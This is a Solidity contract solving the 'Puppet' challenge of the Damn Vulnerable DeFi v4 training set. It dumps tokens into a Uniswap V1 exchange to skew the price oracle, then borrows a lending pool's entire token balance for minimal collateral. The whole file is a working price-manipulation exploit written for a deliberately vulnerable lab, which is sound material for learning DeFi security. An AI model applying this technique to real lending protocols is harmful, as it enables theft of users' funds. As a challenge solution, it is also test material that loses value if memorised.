// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";
import {PuppetPool} from "./PuppetPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract Attack{

    DamnValuableToken immutable token;
    PuppetPool immutable pool;
    IUniswapV1Exchange immutable uniswap;
    address immutable recovery;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;


    constructor(address _token, address _pool, address _uniswap, address _recovery) payable{
        token = DamnValuableToken(_token);
        uniswap = IUniswapV1Exchange(_uniswap);
        pool = PuppetPool(_pool);
        recovery = _recovery;
    }

    receive() external payable {}


    function attack() external payable {
        token.approve(address(uniswap), PLAYER_INITIAL_TOKEN_BALANCE);
        uniswap.tokenToEthTransferInput(PLAYER_INITIAL_TOKEN_BALANCE, 9 ether, block.timestamp + 150, address(this));       
        pool.borrow{value: address(this).balance}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }
}